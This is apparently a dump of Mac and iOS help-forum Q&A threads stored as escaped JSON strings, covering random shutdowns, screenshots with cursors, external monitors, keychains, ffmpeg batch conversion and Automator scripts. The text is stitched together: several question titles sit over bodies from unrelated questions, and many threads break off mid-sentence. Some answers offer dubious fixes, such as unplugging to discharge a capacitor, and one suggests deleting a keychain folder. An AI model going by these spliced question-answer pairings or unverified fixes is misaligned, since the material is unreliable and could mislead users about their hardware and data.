Power and Home buttons until you see a \"connect to iTunes\" message on the iPad. This will allow you to restore the iPad, reinstalling the OS and apps.\n", "Q: How do I dismiss many multiples of the \"Disk Not Ejected Properly\" notification in macOS?

The machine is a late 2012 iMac 3.4 GHz i7 with the 3tb fusion drive (replaced awhile back under the recall program), 32gb of Mac certified RAM  from Crucial, and the NVIDIA GTX 680MX graphic card option.  I sometimes hook it up to an external monitor.  I also typically have the machine hooked up to external USB drives.  The system can run for weeks without issues, then crash or sometimes mere minutes/hours.\nThe behavior is that the system simply shuts down with out warning.\nThings I've tried:\n\n\n*\n\n*Running the machine with a UPS to eliminate the potential for power fluctuations.\n\n*Running the machine without a UPS to eliminate the potential that the UPS is to blame.\n\n*Checked the RAM using a multi-pass scan.\n\n*Replaced the RAM with new RAM directly from Crucial despite no issues found in scan.\n\n*Scanned the hard drive and found no errors. (System uses 3tb Fusion Drive)\n\n*Reinstalled OS w/ restore from Time Machine backup.\n\n*Upgraded the OS.\n\n*Ran the machine w/o the 2nd monitor hooked up.\n\n*Ran the machine w/o the external USB drives hooked up.\n\n*Left machine with the Genius Bar twice and allowed them to run multi-day scans on the machine with no issues detected.\n\n\nThe only thing I haven't tried is to reinstall the OS from scratch and just manually restore everything rather than restoring from a TimeMachine backup.\nToday it crashed again. I'm at a loss and close to just junking the machine.\nI know I should be able to determine something from the Console logs, but I'm not sure what I should be looking for and the volume of information in these is overwhelming.  \nHow would you go about determining exactly what's causing the crash?  Is there a string I should be searching for in the logs that would give me this information or any software I can run to monitor the system health to capture this at crash-time?\n\nA: The resolution to my problem was to replace the internal power supply.  Apple performed the repair for $67 in parts and $79 in labor.  The iMac has been rock solid since the repair was completed.\n\nA: \nHow would you go about determining exactly what's causing the crash?\n\nSince you haven't found a way to bring on a crash at will, and the whole problem appears totally intermittent (i.e. it runs okay for weeks sometimes), it's somewhat harder to diagnose.\nNormally you could go through a process of elimination to troubleshoot this, but that's not going to really work for if you haven't found a reliable way bring on a crash.\nWhat you've done so far has been spot on, and doing a full fresh installation of macOS may be warranted, but before doing that there are some other things you could try. The most obvious one is to boot your iMac into Safe Mode as follows:\n\n\n*\n\n*Fully shut down your iMac\n\n*Restart your iMac\n\n*Immediately press the Shift key and keep it down \n\n*Let go of the Shift key when you see the login window (NOTE: If you have FileVault enabled you may need to log in twice).\n\n\nAt this stage I would normally recommend testing to see if the problem still exists. In your case that's not going to be easy, so I would just use your iMac in Safe Mode for a while until you have a reason to reboot (e.g. not only features are available in Safe Mode, so you may need to reboot at some point anyway).\nNOTE: Don't be concerned if it takes a while to boot into Safe Mode, as your Mac will delete a whole heap of caches, verify your boot volume, etc, and this takes time.\n\nIs there a string I should be searching for in the logs that would give me this information or any software I can run to monitor the system health to capture this at crash-time?\n\nThe answer to this can differ depending on the version of macOS you're running (since macOS Sierra, the Console app is an entirely new beast). \nFor now, as a starting point, I suggest you download EtreCheck and run it (it's free and safe to use). It will produce a report of your system. Look over that and see if it finds anything of concern. If so, update your question to include anything that it flags as a potential problem and, while you're at it, also include your version of macOS and how much free space you have on your startup drive.\n\nA: I had this problem and Have found a suggestion from a friend to have cured it completely. When I log out of my iMac I unplug it from the mains. I'm told this allows a capacitor to completely discharge. This capacitor normally stores some important things in the running of the iMac. This should be reset when you login, however, this capacitor is not being allowed to lose it's charge when you logout.\nI have been doing this for a few days now and it hasn't suddenly out of nowhere changed to a dark screen and a need to login again. I hope this works for other people as well.\n", "Q: Show cursor in screen shot Is it possible to take a screen shot, using hotkeys, where the cursor will not disappear? I am making a short tutorial and it would save me time to have the cursor present, as opposed to post-processing the images.\nFor example, if there is a button I could press in addition to CommandControlShift4 to copy a screen portion to the clipboard, including the cursor, that would be great.\n\nA: Use the Grab Application.  It allows you to superimpose the cursor on screen captures.  Just go into Grab preferences and select the cursor.  When you click on the screen to take the screenshot, Grab will \"place\" the cursor where you click. This works for Window capture. Choosing a pointer from the preference window enables this to work when capturing a window shot.\n\nA: If you press Shift Command 5, a different screen capture screen appears and there is a button at the bottom called Options. Press that, and a menu pops up with an option to 'Show Mouse Pointer'. Select that and the mouse cursor should be included in the screen capture.\n\nA: You need to use Grab. After starting Grab, go to preferences and chose a pointer. Now when you capture a window, the cursor will be shown. Choosing a pointer from the preferences window enables that pointer to be visible in a window capture.\n", "Q: Restore from iTunes does not restore app data? I just restored my iPhone from iTunes. At backup time a Bitcoin app was installed on iPhone, with an already created wallet with a balance. After restore, Copay in on iPhone, but when starting the wallet balance is not included in the app. Why?\n\nA: Wallets and apps that store sensitive data usually store passwords/encryption keys in keychain.

I tried all suggestions on the official Apple forums but nothing worked.\nWhat I understood is that the problem lies with how macOS renders fonts at different resolutions. I am understanding that it has something to do with aspect ratios and the fact that each pixel is represented by 2 physical pixels to give the Retina effect.\nSo my MacBook Pro max resolution is 2560x1600 which gives a 1.6 aspect ratio. A 1920x1080 monitor has a 1.78 aspect ratio. So to my understanding, any external monitor should have a 1.6 aspect ratio to be good for my eyes and to avoid font fuzziness.\nI saw people recommending ultra HD monitors but those too have the same aspect ratio as 1920x1080, so how are they supposed to be better?\nCan someone please explain what I’m missing here?\n\nA: You're missing something entirely. There's absolutely no requirement of having a 1.6 aspect ratio on external monitors on a Mac.\nAs long as you do not configure your displays to be mirrored (i.e. showing the exact same image), then the internal and external monitors are treated as separate displays. The resolution and/or aspect ratio of one monitor has no impact at all on the other monitor.\nRegarding the 2 physical pixels for Retina effect, you're also missing something entirely here. An external monitor with a 1920x1080 resolution is not going to be in rendered in Retina mode. That is only for high resolution displays. Retina is not part of the equation here at all.\nI would ensure that you have chosen font sizes that are large enough for the display. This should cure \"fuzziness\". You might also want to double-check with a different monitor to ensure that it is not this specific monitor that has a problem.\n", "Q: watching videolectures.net on mac How can I watch a lecture from videolectures.net on a Mac?

In other words, does it just hide the permissions on file, or change them? More specifically, if you have a volume with file on it that have different owners and you check Ignore ownership on this volume, and then later you uncheck it, will the original ownerships/permissions revive correctly? \nI have not seen anything that answers this directly, although what I have seen about problems with Ignore ownership settings needing to be reset and about them being recorded in /var/db/volinfo.database suggest that the answer to my questions is yes. Nevertheless, it would be very reassuring if someone could confirm this.\n(The context is that I have a bootable backup on an external disk that I would like to keep the permissions intact on so that I can boot from it if needed, but I would also like to be able to read from it on another computer where the users don’t match up to give me access to the relevant files. Being able to switch Ignore ownership on for the latter, and then switch it off again to leave the disk in good condition for potential boot/restore use, looks like it would be a nice, simple way of doing this, but I am concerned about breaking things if I experiment.)\n\nA: Yes, it is reversible. Checking and unchecking \"Ignore ownership on this volume\" changes how the volume is mounted, but doesn't (directly) change anything on the volume itself. Mounting with owners ignored does two things:\n\n\n*\n\n*When files and folders on the volume are accessed, item ownership is ignored. Essentially, everyone gets owner access. Note that this doesn't mean permissions are entirely ignored, because if the permissions say that an item's owner can't access it, then you won't be able to either.\n\n*When new items are created on the volume, their ownership info is left empty. I don't know the details of how this works, but the effect is that when ownership is reenabled the item effectively belongs to everyone.\nOne result of this is that if you edit a file with a program that saves via delete-and-replace (many do), the ownership for that file will be lost. Similarly, if you copy items within the volume, the copies will be ownerless.\nAlso note that this option is a per-volume-per-computer setting. That is, if you plug a disk into your computer and set it to respect ownership, and then move it to another computer and set it to ignore ownership, each computer will independently remember their setting and re-use it when it sees that volume again later.\nIn your situation, I wouldn't be too worried about breaking things as long as you don't mess with the OS files on the computer with ownership ignored. It might be better to minimize making changes (editing, copying, and creating files and folders) on the computer with ownership ignored, but that's unlikely to cause serious problems.\nIf you're just reading items with ownership ignored (or copying them off to another volume), there should be no problem at all.\n\nA: Yes, ignoring ownership is reversible, but I wouldn't recommend that as being a solution to your problem because the Ignore ownership on this volume option shouldn't be used on a drive you also want to use as a bootable drive for one of your Macs. And, since your Macs are running different versions of macOS, you may be asking for added trouble. In addition, you mention that this is also a backup drive - while you don't clarify this, in the case of drives also used by Time Machine Apple recommends:\n\nMake sure \"Ignore ownership on this volume\" at the bottom of the \"Sharing & Permissions\" section of the Get Info window is deselected (unchecked).\n\nSource: https://support.apple.com/HT202380\nIgnore ownership on this volume\nThe main reason the Ignore ownership on this volume option exists is to ensure that file servers, applications, operating systems, etc can still function correctly because they require permissions to keep track of which users have access to which files. \nHowever, drives used purely for data storage (as opposed to being boot volumes) shouldn't generally use permissions and ownership (although they can be secured in other ways). \nWhat I'm saying is that the Ignore ownership on this volume option shouldn't be used for boot disks or server volumes (and you may not even get the option anyway - depending on macOS version). It's best this is only used for drives that are used purely for data storage, and even then only for drives that are directly connected to your computer.\n", "Q: Is it possible to have an Apple Genius replace my Fusion drive with an SSD in my iMac? Can I take my iMac to an Apple store and have the Geniuses replace its Fusion drive with a pure SSD?\n\nA: Yes and no. \nIf it's under warranty, then it's a definite no, even if you're willing to pay for it.\nIf it's not under warranty, the answer gets a little more complicated because it depends on the exact model of iMac, its status (i.e. is it considered by Apple to be vintage or obsolete), and to some degree to your location.\nThe best answer we can give here is that you need to contact your nearest Apple Store and ask them.\nMy advice would be that if it is under warranty, to just leave things as they are. If it's a real issue for you, then you may have other options (such as using an external SSD as your boot drive, etc). \n\nA: M-M prohibits manufacturers from requiring that repairs or maintenance be done by authorized service centers using OEM parts and supplies in order for the product's warranty to remain in effect. While customer-initiated product changes unrelated to a failure don't invalidate warranty coverage on other parts of a covered mechanism, M-M does not require manufacturers to upgrade or change their products at customer request, even if the customer is willing to pay for the work. \nThe \"no\" that the OP will hear is because Apple chooses not to modify its products still under warranty. This is a rational position. The OP must either wait until the warranty is over (in which case an Apple service center or store might do the work), or take the Mac to to a non-Apple provider, or do the work on his own.\n", "Q: How can I sort PDF by date in Adobe Acrobat on iOS?

However, the other night while it was loading, his location appeared to be some distance across the street, and then when it loaded it appeared to be in the middle of the street. \nNormally it is a little off, but still closer to his house then it was the other night. \nIs it normal that the location can appear to hop around a little, or for it to be a little off?\n\nA: The exact location shown by the Find My Friends (or the Find My iPhone) service can be off somewhat, and the distances can be a lot more than what you've described.\nFor example, in our household we have about 20 devices. We also live on acreage and back onto an environment reserve. Sometimes, when using the Find My iPhone service, I can see one or more devices appear as if they're in our next door neighbour's yard, somewhere within the bush surrounds of the reserve, in the creek, and so on.\nSo, while it's impossible for anyone here to give you any certainty on where your boyfriend's device was at the time, we can say that the location being reported could easily be off by a distance of more than just appearing to be across the street.

Of course, that is limited to Opera itself, and not your entire Mac (which may be either good or bad, depending on your requirements).\nIf you're bedded to using Google Chrome, then you could try and use the full macOS version of TunnelBear which will camouflage all your internet traffic, or opt just for the TunnelBear Chrome extension which only acts within Chrome itself. Either of these options will allow you to pick a geographical location that is predominantly English speaking.\nIf you opt for the Opera browser, it's entirely free.

I give a lot of talks using PDF slides built with LaTeX beamer.

The main issue that rendered PDFkit unusable for presentations is the fact that it first shows a low resolution version of the content, before actually showing the high resolution rendering. This is very bothersome in the context of overlays.\n\n\n*\n\n*In Sierra one could circumvent this by scrolling through the entire presentation beforehand, which apparently built up the cache of high resolution renderings\n\n*In High Sierra this is no longer possible, every time a page is shown it is shown at low resolution for a split second\n\n\nThus, I'm looking for alternative PDF viewers, which support two displays without mirroring but do not rely on PDFkit for rendering.

The homebrew variants are native. You can install them without doing any harm on your MacPorts setup.\n\n*The graphical Présentation.app and the console-based pdfpc assume a dual-screen setup and provide a presenter display with the next slide, elapsed time and so on. Both internally pre-render the PDF pages. Depending on the complexity of the slides (transparencies have quite an impact), this may take a while. However, the presentation output is superb.\n\n*Apparently, xpdf does not do pre-rendering. While it is fast in general, switching to a new slide causes flicker.\n\n\nA: You might also want to check out SlidePilot. \nDisclaimer: I am the developer of the app\nThe app is my interpretation of what presenting PDFs should look like on the Mac. I wanted the same superb presenter experience you have with Keynote but all the existing apps couldn't fulfill my needs. That's why I developed SlidePilot with a lot of additional features like broadcasting the cursor to the presentation screen (without having to turn your head) or covering the screen.\nFeel free and take a look at the website and the docs, where all features are described in detail.\n\n", "Q: MBP Folder/Question mark icon, but boots ok with Option key I have a 2012 classic MacBook Pro that crashed the other day when waking from sleep.

I'm travelling outsude my home country and my data roaming is turned off on my iPhone, the car is rented Mini Cooper Countryman 2017. I usually connect the iphone via USB or Bluetooth and the car multimedia is paired with it. I don't use Apple Car Play (the multimedia screen looks like native Mini Cooper multimedia).  The strange behaviour that I figured out is that I have no music downloaded on my iPhone (doublechecked it, i have big library though) but while connected to the car multimedia I'm able to navigate the music library from car display and listen arbitrary music from the library. This music is not downloaded nor the mobile internet icon is showing up on the iphone status bar. How can the car multimedia play music?\n\nA: You were likely able to play music that had been cached locally on your device. Apple Music caches songs as you play them so that, if you play them again, they play locally from your device.\nIn the future, if you're inclined to test out this theory, you can clear your Apple Music cache prior to a trip and then observe whether you're able to play any music.\n\nA: Either you are wrong in having no music stored on the iPhone, and you have indeed got songs stored - or you're wrong about having no Internet connection. If you have no cellular connection, you could be connected via WiFi. Some cars offer WiFi with a SIM-card in the car.\nIn essence, there's no magic ether of Apple music flying around that the phone can tap into.\n", "Q: How to rebuild my Font Book database I was having trouble with my font cache in Photoshop, so per Adobe's instructions I reset the font cache with:\nsudo atsutil databases –remove\n\nNow, while most applications will show my fonts, Font Book comes up completely empty:\n\nIs there something I need to do in order to restore my Font Book database?\n\nA: Restarting my computer fixed it.\n\nA: I am seeing that behavior in several computers at the office where the font\nbook shows empty and i haven't rebuilt the font book.

After 5 minutes, the throbber under Apple icon just halts and screen freezes.\nMay it be because the SSD drive is not recognized?\nHow can I fix this issue?\nIs it possible to see the verbose output of CMD + R recovery attempt?\n\nA: Why don't you try bootable disk drive utility method;\nHere is how this process works. First, it's necessary for you to prepare a USB flash drive. With that you can create and install a bootable OS X installer drive and then to fix Mac not working in recovery mode issue.\nFor that;\n1.Reboot Mac and keep taping “Option” until you hear the sound.\n2.Attach your bootable installer drive to Mac and choose it from the pop up list.\n3.Then your Mac will restart and you are able to fix Mac.\n", "Q: How to find if a USB has been plugged in on a certain date? Starting from this great script offered by Daniel Azuelos\ncd /Volumes/suspicious_USB\n/usr/bin/sudo find . -atime -21 -exec ls -dluT {} \\;\n\nHow is it possible to modify it in order to find if a USB flash was plugged in, on any random computer, on a certain date?\n\nA: In Linux, there is a USB subsystem which creates system log events.\nSo it can tell you what was plugged into your PC. But it can’t in general tell whether it's a USB stick or something else connected to a PC, unless some files were changed. While USB sticks and SD cards are usually formatted as VFAT for compatibility, there’s no reason they can’t be formatted with a more powerful filesystem such as EXT3 or NTFS. In which case, if a USB stick was mounted read-write and not “noatime”, the file access timestamp would indicate if a file had been read, or if a directory had been accessed by a graphical desktop to create folder icons.\nSince this is built-in to Linux and is part of the USB specification, it must be possible to get the same level of detail in other operating systems using an appropriate application.\n", "Q: Mac can’t read iPhoto I tried to import my photos and videos from my iPhone to my Mac and it used to work, but this time it wouldn’t let me and would say “the following file could not be imported. the file is in an unrecognized format” what do I do?\n\nA: switch usb port.

I don't know why, but these days my fans for some reason run throughout the day. When the fans start spinning the computer becomes extremely laggy. I have also tried running Macs Fan Control app after reading about it, but my system still hits 80°C. At that time it also freezes for 5 seconds to 2 minutes. \nSo any suggestions as to why it might be happening, and how I can fix it?\nSystem:\nRunning macOS High Sierra 10.13.3\nMacBook Pro (15-inch, Mid 2012)\nProcessor: 2.3 GHz Intel Core i7\n\nA: \nSo any suggestions as to why it might be happening? Is it overheating?\n\nNo, it's not overheating.  It's actually attempting to prevent an overheat condition.\nYour MacBook Pro is doing two things to keep the CPU/GPU within operating temperature tolerances:\n\n\n*\n\n*spinning up the fans, to cool the CPU\n\n*allocating CPU to lower the load demand\nWhen you install software to override the SMC's control of the fans (cooling), you force the system to increase the CPU allocation to prevent additional load - it will become slower.\nWhat you should do is \n\n\n*\n\n*clean the dust from the fans\n\n*put in new, high quality thermal paste on the CPU heat sink\n\n\nThere are excellent videos on how to do this procedure on YouTube\n\nA: My computer heats up massively (super hot to the touch) when plugged into power and/or plugged into external Apple display. And slows down massively (almost frozen).\nThe only solution that I have found, without opening the laptop, is to disconnect from display AND disconnect from power, for the laptop to cool down.\n", "Q: VoiceOver Rotor on Mac… why is called \"Rotor?\" I was giving a presentation on accessibility tools for the Mac and launched the VoiceOver Rotor utility. Someone in the audience asked why it was called \"Rotor?\" I had no answer for them. In doing some Googling around, I saw that on iOS, the Rotor is like a virtual knob that allows you to toggle through various functions:\n\nIt being called \"Rotor\" makes sense if it's a knob-like thing, I guess. But it's just a series of lists on the Mac.\nDid the rotor come to iOS first and now that it's on the Mac it has just inherited the name? Or is there some other origin to its name that I'm not seeing?\n\nA: I think its as simple as the two-fingered turning gesture is analogous to turning a rotor/knob/dial.

I reinstalled High Sierra after the first few, but I'm still getting them. Terminal reported the shutdown code -60 in all cases, which I understand is due to a bad master directory block. \nHowever, I'm having none of the symptoms described in this post - the only thing going wrong with my computer is that it shuts down at random and unpredictable intervals (~1x a day).

As mentioned, I reinstalled the OS, and I ran disk utility after wiping the hard drive, plus I ran it after the most recent incident. The drive is a Samsung SSD that I self-installed about 5 years ago. I only just started getting these shutdowns.

A small window opens with various info. It will list capacity, available, and used numbers for the drive. I don't understand what they are using for the available number but you can take the capacity number and subtract the amount used from it. This should give you an accurate number for the amount of space available.\n", "Q: How to use iCloud as main storage location for all documents, application files, etc? I have an iMac, Macbook Pro and an iPad Pro, but I'm relatively new to the IOS/OSX ecosystem as I've only used these devices for very specific use cases. I'm in the process of making the switch to all Mac. As part of that quest, I signed up for iCloud and I'm paying the monthly subscription for 2TB. Since that amount of storage is greater than the sum of all of my devices, I would like the apps that need to save files somewhere to all save on iCloud. This way I can access those files from any device without having to think about which device the files are on, or having to make sure I sync the files or folder. \nIs this possible? Is it even a feasible idea to use the cloud in this way?\n\nA: What you want to do is possible, assuming your internet connectivity is good on all devices (which I assume it is) and that they’re running a supported version of iOS and macOS.\nMore specifically, iCloud Drive requires iOS 8.0 or above and Mac OS X Yosemite or above.\nIf your Macs are running macOS Sierra or above, you’ve also got the option of Optimized Storage. I encourage you to read How to free up storage space on your Mac for detailed information.\nI also encourage you to read Manage your photo and video storage to help you understand the best ways of doing this on iOS devices if you’re wanting everything stored online.\nAnd, assuming you’re running iOS 11 or above on your iOS devices, you’ll want to use the Files app. Read Use the Files app on your iPhone, iPad, and iPod touch for more information.\n", "Q: How to add startup program using Terminal?

I just need something I drop a couple (or 20 thousand) Apple Lossless files into and let it crank away making me some AAC compressed files or some MP3 or whatever. \n\nA: FFMPEG and a simple bash script will get the job done.  FFMPEG is the same set of libraries that are included with products like Handbrake.\nThe basic syntax is very simple:\nffmpeg -i inputfile outputfile\n\nIf you wanted to convert a FLAC to MP4, you would simply enter\nffmpeg -i inputfile.FLAC to outputfile.MP4\n\nTo convert a number of files a simple bash script like the one below will convert \nfor file in /foo/bar/*.mp3\ndo\n    fullfilename=$(basename \"${file}\")\n    filename=\"${fullfilename%.*}\"\n    ffmpeg -i \"$file\" \"/foo/bar/converted/$filename.mp4\"\ndone\n\nThis basic script parses through a directory, takes the original filename, then removes the extension so a new extension can be added during output.  \n", "Q: Installation of mac brew vim version 8.1 I'm using brew vim which is currently at version 8.0.1850 but 8.1 has just been released and I'm wondering if there is a way to upgrade to it yet?

Both are running MacOS High Sierra.\nDuring the first couple of starts, my wife's MacBook booted fine from the SSD but froze after 10-15 minutes of work. I also noticed that sometimes when pressing the \"Alt\" key during startup to select the external drive, the partitions of the external SSD did not show up and I had to reconnect the OWC enclosure.\nAs the freezes reoccurred several times, I assumed my MacOS installation on the external SSD to be faulty which I thought would also explain the crashes during sleep mode etc. When I then booted into the 2012's regular High Sierra installation, it mounted the external Bootcamp partition fine and asked me for the password of the external MacOS partition which is APFS encrypted. However, the password was not accepted at all. There is no chance of mistyping after dozens of tries with a password that uses no caps or numbers or other signs (yes, bad, I know) and caps lock is disabled.\nBoth drives (the internal of the 2012 as well as the now external of the 2015 Mac) have been fully converted to encrypted APFS long before, so it should not have to do with the frequently found problem of stuck encryption of (external) drives.\nAfter googling quit a bit, I found this website in the Apple Developer's Forum:\nhttps://forums.developer.apple.com/thread/80174\nUser \"croaker\" suggested some commands to run from terminal

Looking at the activity monitor after a couple of weeks of uptime (most of it spent in standby), kernel_task shows 1.43TB (!) of bytes written to disk right now:\n\nWhat is wrong here - how can I diagnose why kernel_task is writing so much data to the disk? (This happens all the time after each reboot).\nMemory pressure is still \"green\" most of the time. Running out of space is also not an issue so most of the data seems to be \"temporary\".\nHowever, I am a bit worried about my SSD - writing 25 TB per year (in addition to the \"regular\" workload) does not seem to be a good idea...\nAny ideas?\n\nA: I had the same issue on my 2010 MacBook Pro.\nThe fix for me was to clean out the dust from inside my laptop. I removed the fan (just requires unscrewing it with a special screwdriver, like the type for installing a hard drive) and there was a giant amount of dust blocking the airflow.\nKernel_text helps regulate the computer temperature. It was trying, but the fan couldn't do its job. After this fix, I went from 500 GB of kernel_text disk usage within a few hours of computer use, to less than 2 GB.\nInterestingly, this also seemed to fix the issue of disnoted and sharedfilelistd processes using too much CPU.\nHowever, my computer didn't have massive disk usage from the CrashPlanService process, so you might have a different issue.\n\nA: This is because the system is constantly swapping SSD for RAM, writing for moving data from RAM to SSD, reading for the moving it back.\nThe root cause is RAM is not sufficient...\n", "Q: How to purchase a used Apple Watch?

But all menu items for the \"Local Items\" keychain are disabled in Keychain Access, and I can't figure out how to refer to the \"Local Items\" keychain using security.\nNote that this means it is impossible to unlock my \"Local Items\" keychain from Keychain Access. Moreover, when the keychain is needed (e.g. to login to a website) it is not asked fo: now \"allow\" dial is presented.

crashing and force ejecting an external drive, the Local Keychain stopped locking itself, and remained open as expected. Rebooting, however, reverted to the locking behavior described above.\nUPDATE: Suddenly this no longer happens. Apple logged me out of my Apple ID and made me go through a new procedure where I used by recovery key, and was asked to provide my machine login info, and my iPhone unlock code? (I was also told that recovery keys were no longer usable, unless I changed setting to enable them, though it's not clear how.) Does Apple now have my machine login info; my iPhone unlock code? In any case, my keychain now stays unlocked.\nUPDATE: Never mind, that was only temporary. It still locks (even after updating to Bug Sur).\n\nA: Warning - there's a chance you'll lose data or a keychain. Please ensure you have a complete backup and can wipe and restore before proceeding.\nThe security command doesn't list the \"Local Items\" keychain because it isn't an actual .keychain file. It is, rather, a virtual keychain created from a database (keychain-2.db) and associated index files. Regrettably, it appears either this database or one of its auxiliary files has somehow become corrupted, and is preventing Keychain Access from.. well.. accessing the virtual keychain.\nTo proceed, navigate to ~/Library/Keychains/ and locate the only folder present with a name that looks like alphabet soup (it's actually an anonymous UUID identifier, comprising 32 hexadecimal characters separated by dashes). Delete it and restart the computer. The directory and its content will be rebuilt during the boot process.\nI myself have used this with no negative consequences, discretion dictates the warning to have a backup before implementing this potential solution.\n", "Q: Merge two partitions I've 2 partitions on my mac\n350GB\n150GB\nWhat I need to do is to delete the 150GB permanently and put it back into the 350GB\n\nAny help would be highly appreciated.\n\nA: For merging partitions, it isn't possible, as partitions are not designed that way.

(I've scoured the internet looking for information about this but haven't found anything so far!)\nSecond, is there a device I can use just for connecting two external monitors via DVI, HDMI, or DisplayPort to the MacBook Air's Thunderbolt 2 port, other than an expensive general purpose Thunderbolt 2 dock like one of these? I should add that I'm not interested in using devices that connect to a USB 3 port and use a DisplayLink driver.\n\nA: Just for posterity I'll answer my own question:\nAfter doing quite a bit of searching around, I eventually figured out that the easiest and cheapest way to accomplish this would be to use the StarTech brand Thunderbolt 2 Dual-Monitor Docking Station. Even with a MacBook Air, you can still plug in two external monitors simultaneously. I found reports that it works as advertised. Note that I have not purchased one and tried it myself, though.\n\nA: If anyone is still interested-- a great way to get dual monitors for the MacBook Air (early 2015) 11\" (in my case) is to utilize the Thuderbolt port for one of the monitors...... and then use an old Apple TV and use AirPlay for the second.\nUltimately, you'll need to know how to use your Apple TV to cast your MacBook Air onto another display (e.g., a TV), but when you do (while already being connected to one display through your Thunderbolt port, you can find the option to 'Use As Separate Display' when you click the \"screen cast\" icon in the upper right-hand corner of your screen.\nUsing this method, you can get 3 screens in total: \n\n\n*\n\n*The Thunderbolt port monitor\n\n*The Apple TV-connected monitor\n\n*Your MacbookAir's monitor\n\n\nHope this helps someone (and I hope I capitalized all my proper nouns correctly).\n\nA: The MacBook Air (Early 2015) can natively support a single external display with a resolution up to 3840x2160. \nFrom the Technical Specifications:\n\nDual display and video mirroring: Simultaneously supports full native\n  resolution on the built-in display and up to 3840 by 2160 pixels on an\n  external display, both at millions of colors.\n\nTo get a second external monitor, you will need a USB to DVI or HDMI or VGA adapter.  \n\nI should add that I'm not interested in using devices that connect to\n  a USB 3 port and use a DisplayLink driver.\n\nYou have to.  The integrated graphics chipset only supports a single external monitor so you need another adapter to support an additional monitor; there's no getting around this.\n\nA: Sharing this in case anyone finds it useful. You can get 2 thunderbolt displays, plug the thunderbolt end from one of them into the other thunderbolt display's port, then plug that display's thunderbolt end into the MacBook Air's thunderbolt 2 port.\n\nA: I used a white GE Thunderbolt adapter from Walmart to connect a to a VGA monitor. Then I used an Apple TV 4K box with AirPlay from my 2015 MacBook Pro to an HDMI monitor hooked up to the Apple TV. It works like a charm and is  not that expensive; under $100 \n\nA: I have the same computer and situation as most people here. Buy this adapter and it will work:\nj5create USB to HDMI Adapter - Dual HDMI USB 3.0 Multi-Monitor Cable | 4K Ultra HD | Compatible with Microsoft 7, 8.1, 10 / Mac OS X v10.6 and Above https://www.amazon.com/dp/B06XKWTXX9/ref=cm_sw_r_cp_api_glt_fabc_VT0H466QDJRKF58XMJ25?_encoding=UTF8&psc=1\nInstall the driver in the instruction booklet before you insert the adapter into your computer. After you install the driver, restart your computer. After you restart your computer, go to system preferences > Security & Privacy > Privacy again > Screen Recording > then check the box for DJTVirtualDisplayAgent. You will need to restart your computer again. After the second restart, you are good to insert the adapter, plug in your HDMIs and rearrange the digital screens. This saved my life and it is the solution to this problem. Spreading the gospel.\n\nA: Any definitive answer on this one?\nI have a 2015 Macbook Air 11\" with one 27\" Thunderbolt Display. I'm considering getting a second one (used, obviously), I like them and my MBA couldn't handle 4K or anything more modern anyway.\nAny success stories with daisy-chaining here?\nThanks!\nEdit: I did connect my TV as a second monitor using Apple TV as suggested above, it works, but 1) the TV is in a different room, I would need to move my desk, unpractical and 2) I can't seem to adjust the definition to be satisfactory (ok for videos from a distance, not so much for reading a text). Any suggestions are welcome!\nEdit 2: I have the answer to my own (and the original) question: yes, I can confirm that a Macbook Air 11-inch, Early 2015, 2,2 GHz Intel Core i7, 8GB can in fact support two daisy-chained Apple Thunderbolt 27\" monitors. I have just purchased a second-hand second one (I had bought my first one ten years ago and I was still perfectly satisfied with it), hooked it up and it works perfectly. No fans spinning, lots of real estate, great stuff! Absolutely recommended!\nIt may not be the least expensive solution, but it's so easy, no need for any tweaking, adaptors, changing settings anywhere, it just works! As far as I'm concerned the only way to go for a dual screen solution on MBAs (or MBP, haven't tried, but if an MBA supports it an MBP will too), especially now that you can get an Apple Thunderbolt Display for half what they cost when they first came out.\nTo anyone wanting to follow suit: go ahead and enjoy!\n\nA: I bought this: https://www.amazon.com/dp/B06XKWTXX9?psc=1&ref=ppx_yo2ov_dt_b_product_details\nand followed the instructions for install + the tips by Kelby Royal above, and can confirm it definitely worked for me.\nI have the:\nMacBook Air (13-inch, Early 2015)\n2.2 GHz Dual-Core Intel Core i7\n8GB Ram\nIntel HD Graphics 6000 1536 MB\nHope this helps\n", "Q: Take a screenshot of a QuickTime movie frame?

I would like to highlight a markdown file in finder, then select the 'md2tex' service, which will turn the markdown file into a .tex file. I have got this to run fine in the terminal. However, when I try to automate it, it doesn't work. When I open Automator, I create a new service, then a drag and drop 'run shell script' into the window on the right. Other options are shown in the window below. I have used the $@ symbol to refer to the variable name (name of file). The screenshot shows all of the options / settings.\n\nI get a weird error message 'syntax error at -e line 1'. Any help appreciated.\n\nA: First, change the Shell pop-up from /usr/bin/perl to /bin/bash. That's what's causing the error -- it's trying to run the script with perl, and it's not in valid perl syntax.\nSecond, the script itself needs some work. $@ expands to all arguments (in this case, the paths of all selected files), but your script expects just one item. If you don't want it to fail if multiple items are selected, you should either just have it operate on the first, or make it loop over all of the items. looping is usually what you want, and in fact when you add that action to your Automator service it should auto-fill a template for looping over the items. Next, you need to put double-quotes around all references to file paths (and variable references in general) or it'll be hopelessly confused by file/folder names with spaces. Next, the path(s) it's going to receive will include the full filename, including \".md\", so adding another \".md\" will make it fail. To get the output filename, you may want to remove the \".md\" before adding \",tex\".\nHere's my quick stab at a script:\nfor f in \"$@\"\ndo\n    if [[ \"$f\" = *.md ]]; then\n        /path/to/pandoc -s --template=generic.latex \"$f\" \"${f%.md}.tex\"\n    fi\ndone\n\nYou'll need to fill in the full path to the pandoc executable, in place of \"/path/to/pandoc\" in the script. You can probably fund this by running the command which pandoc in your regular shell.\nI made it skip anything other than \".md\" files; you might want to change that part. If so, you might need to generalize the \"${f%.md}.tex\" part -- that removes a \".md\" extension before adding \".tex\", but if the input file has some different extension it'll just tack on \".tex\" in addition to whatever's there. Warning: don't use \"${f%.*}.tex\" because in some cases that'll remove part of the directory name the file's in!\nOh, and for actual use as a Finder service, you need to remove the \"Get Selected Finder Items\" action -- that's good for testing in Automator, but you need to remove it or it'll add whatever's selected in the Finder to what it's supposed to run on (probably meaning it runs twice on everything).\n", "Q: How to clear selection in OS X Terminal?

